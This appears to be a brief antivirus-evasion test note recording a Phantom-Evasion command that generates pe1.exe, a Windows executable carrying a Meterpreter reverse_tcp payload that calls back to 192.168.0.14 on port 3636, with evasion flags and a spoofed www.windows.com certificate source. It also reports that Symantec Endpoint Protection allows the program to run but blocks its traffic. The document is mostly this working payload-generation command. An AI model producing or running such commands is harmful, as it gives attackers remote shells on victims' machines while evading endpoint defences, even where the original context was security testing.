pe1.exe
SEP initially allows for a click through to run the unknown program however web traffic is ultimately blocked by SEP.
python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.0.14 -P 3636 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -c www.windows.com:443 -f exe -o pe1.exe
